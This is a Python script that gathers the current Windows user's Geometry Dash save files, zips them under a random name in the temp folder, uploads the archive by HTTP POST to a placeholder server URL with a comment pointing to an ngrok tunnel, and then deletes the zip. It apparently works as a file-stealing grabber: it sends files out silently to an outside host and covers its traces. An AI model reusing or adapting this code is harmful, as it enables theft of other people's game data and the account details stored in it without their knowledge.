import os
import requests
import zipfile
import random
import tempfile

# Paths to send
saved_paths = [
    f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\GeometryDash\\CCGameManager.dat',
    f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\GeometryDash\\CCGameManager2.dat',
    f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\GeometryDash\\CCLocalLevels.dat',
    f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\GeometryDash\\CCLocalLevels2.dat'
]

# Filter only existing files
existing_files = [f for f in saved_paths if os.path.exists(f)]
if not existing_files:
    print("[-] No files found to send.")
    exit()

# Create a random 6-digit zip name in the temp folder
zip_name = f"{random.randint(0, 999999):06d}.zip"
temp_dir = tempfile.gettempdir()
zip_path = os.path.join(temp_dir, zip_name)

# Create zip and add files
with zipfile.ZipFile(zip_path, 'w') as zipf:
    for file in existing_files:
        zipf.write(file, os.path.basename(file))  # Add file with only its name
print(f"[+] Created temporary zip: {zip_path}")

# Server URL (replace with your free.app ngrok URL)
SERVER_URL = "yourlink/upload"

# Send the zip
try:
    with open(zip_path, 'rb') as f:
        response = requests.post(SERVER_URL, files={'file': f})
        print(f"[+] Sent zip {zip_name} | Status code: {response.status_code}")
except Exception as e:
    print(f"[-] Error sending zip: {e}")

# Delete the temporary zip
try:
    os.remove(zip_path)
    print(f"[+] Deleted temporary zip: {zip_path}")
except Exception as e:
    print(f"[-] Error deleting temporary zip: {e}")
